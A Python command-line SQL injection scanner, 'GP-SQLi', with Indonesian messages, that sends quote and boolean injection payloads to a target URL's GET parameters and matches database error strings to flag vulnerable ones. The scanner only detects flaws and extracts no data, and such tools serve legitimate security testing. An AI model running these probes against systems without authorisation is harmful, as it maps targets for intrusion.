#!/usr/bin/env python3
"""
GP-SQLi — Autonomous SQL Injection Scanner & Checker.
By Gopyr
"""
import argparse, json, sys, os, time
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LOGO = """
  _______  _______            _______  __      __
 |   _   ||   _   | .---.-.  |   _   ||  |    |__|
 |  | |  ||  | |  | |  _  |  |   1___||  |__  |  |
 |  |_|  ||  |_|  | |___._|  |____   ||_____| |__|
 |_______||___  __|          |_______|            
              |__|                                
By Gopyr
"""

DB_ERRORS = {
    "MySQL": ["you have an error in your sql syntax", "warning: mysql", "is not a valid mysql result", "check the manual that corresponds to your mysql server version"],
    "PostgreSQL": ["pgsql: ", "postgresql query failed", "pg_query():", "query failed: error: "],
    "Microsoft SQL Server": ["unclosed quotation mark after the character string", "dbo.", "microsoft ole db provider for sql server", "sqlserver error"],
    "SQLite": ["sqlite3::", "sqlite_error:", "unrecognized token:", "syntax error near"],
    "Oracle": ["oracle error", "ora-00933", "ora-01756", "oracle parameter"]
}

PAYLOADS = [
    {"type": "Error-based", "payload": "'"},
    {"type": "Error-based", "payload": "\""},
    {"type": "Boolean-based", "payload": " AND 1=1 --"},
    {"type": "Boolean-based", "payload": " AND 1=2 --"}
]

def check_sqli(url):
    print(f"\n[+] Menganalisis target: {url}")
    if "?" not in url:
        print("[-] Target harus berupa URL dengan parameter GET (contoh: http://target.com/page.php?id=1)")
        return None

    report = {
        "url": url,
        "is_vulnerable": False,
        "vulnerabilities": []
    }

    # Extract target url & param
    base, params_str = url.split("?", 1)
    params = dict(x.split("=", 1) for x in params_str.split("&") if "=" in x)

    # 1. Error-based Check
    for p_name, p_val in params.items():
        print(f"[+] Menguji parameter '{p_name}' dengan teknik Error-Based...")
        for p in PAYLOADS[:2]:
            test_params = params.copy()
            test_params[p_name] = f"{p_val}{p['payload']}"
            try:
                r = requests.get(base, params=test_params, timeout=5, verify=False)
                for db, errs in DB_ERRORS.items():
                    for err in errs:
                        if err in r.text.lower():
                            vuln_info = f"SQLi {p['type']} terdeteksi pada parameter '{p_name}'. Database diidentifikasi sebagai: {db}"
                            print(f"  [\033[91mRENTAN\033[0m] {vuln_info}")
                            report["is_vulnerable"] = True
                            report["vulnerabilities"].append({
                                "parameter": p_name,
                                "type": p["type"],
                                "payload": test_params[p_name],
                                "evidence": err,
                                "db": db
                            })
                            break
            except Exception as e:
                continue

    # 2. Boolean-based Blind Check
    if not report["is_vulnerable"]:
        for p_name, p_val in params.items():
            print(f"[+] Menguji parameter '{p_name}' dengan teknik Boolean-Based Blind...")
            # Run test with true condition
            params_true = params.copy()
            params_true[p_name] = f"{p_val}{PAYLOADS[2]['payload']}"
            # Run test with false condition
            params_false = params.copy()
            params_false[p_name] = f"{p_val}{PAYLOADS[3]['payload']}"

            try:
                r_orig = requests.get(url, timeout=5, verify=False)
                r_true = requests.get(base, params=params_true, timeout=5, verify=False)
                r_false = requests.get(base, params=params_false, timeout=5, verify=False)

                # If response lengths or text are significantly different
                if len(r_true.text) == len(r_orig.text) and len(r_false.text) != len(r_true.text):
                    vuln_info = f"SQLi Boolean-based terkonfirmasi pada parameter '{p_name}'"
                    print(f"  [\033[92mRENTAN\033[0m] {vuln_info}")
                    report["is_vulnerable"] = True
                    report["vulnerabilities"].append({
                        "parameter": p_name,
                        "type": "Boolean-based Blind",
                        "true_payload": params_true[p_name],
                        "false_payload": params_false[p_name]
                    })
            except Exception:
                continue

    if not report["is_vulnerable"]:
        print("[+] Pengujian selesai: Tidak ditemukan celah SQL Injection dasar.")
    else:
        print(f"\n[\033[91mKONSUP\033[0m] Target RENTAN terhadap SQL Injection! Ditemukan {len(report['vulnerabilities'])} celah.")

    return report

def interactive_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(LOGO)
    print("GP-SQLi Interactive Mode\n")
    url = input("Masukkan URL Target (e.g. http://testphp.vulnweb.com/listproducts.php?cat=1): ").strip()
    if not url:
        print("URL tidak boleh kosong.")
        sys.exit(1)

    out = input("Simpan output JSON (default: sqli_report.json): ").strip() or "sqli_report.json"
    report = check_sqli(url)
    
    if report:
        with open(out, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"[+] Laporan disimpan ke {out}")

def main():
    if len(sys.argv) == 1:
        interactive_menu()
        return

    parser = argparse.ArgumentParser(description="GP-SQLi — Autonomous SQL Injection Scanner By Gopyr")
    parser.add_argument("url", nargs="?", help="Target URL dengan parameter GET")
    parser.add_argument("--output", help="Output JSON report file", default="sqli_report.json")
    args = parser.parse_args()

    if not args.url:
        interactive_menu()
        return

    report = check_sqli(args.url)
    if report and args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2)
        print(f"\n[+] Laporan disimpan ke {args.output}")

if __name__ == "__main__":
    main()
